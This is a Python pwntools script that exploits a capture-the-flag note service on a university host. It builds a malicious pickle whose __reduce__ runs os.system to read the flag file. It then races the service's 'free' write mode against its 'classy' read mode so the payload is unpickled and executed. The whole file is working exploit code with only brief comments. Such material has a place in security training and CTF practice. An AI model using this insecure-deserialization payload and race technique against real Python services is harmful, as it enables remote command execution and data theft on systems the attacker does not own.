from functools import partial
from pwn import *
import pickle
import os
import codecs

class shell_access(object):
    def __reduce__(self):
        return (os.system, ('cat /home/ctf/flag', ))

bad_note = pickle.dumps(shell_access())

# free
def writes_script(): 
    r = remote('mustard.stt.rnl.tecnico.ulisboa.pt', 22653)

    r.recvuntil(b"Username:")
    r.sendline(b"baduser")                          # username
    
    r.recvuntil(b">>>")
    r.sendline(b"1")                                # choose free option
    
    r.recvuntil(b">>>")
    r.sendline(b"1")                                # choose write option
    
    r.recvuntil(b"note_name:")
    r.sendline(b"badnote")                          # note that will have the script
    
    r.recvuntil(b"note_content:")
    r.send(bad_note)                                # sends a script that gives shell access
    r.sendline(b"\n")                               

# classy will read the file written on FREE withouth pickle.dumps()!
def read_script(): 
    s = remote('mustard.stt.rnl.tecnico.ulisboa.pt', 22653)

    s.recvuntil(b"Username:")
    s.sendline(b"baduser")                          # username
    
    s.recvuntil(b">>>")
    s.sendline(b"0")                                # choose classy option
    
    s.recvuntil(b">>>")
    s.sendline(b"0")                                # choose read option
    
    s.recvuntil(b"note_name:")
    s.sendline(b"badnote")                          # note that will have the script executing it when pickle.loads()
    
    print(s.recvall().decode())
    

# it will run writes_script() and read_script() in parallel 
while True:
    Thread(target=partial (writes_script,)).start() 
    read_script()
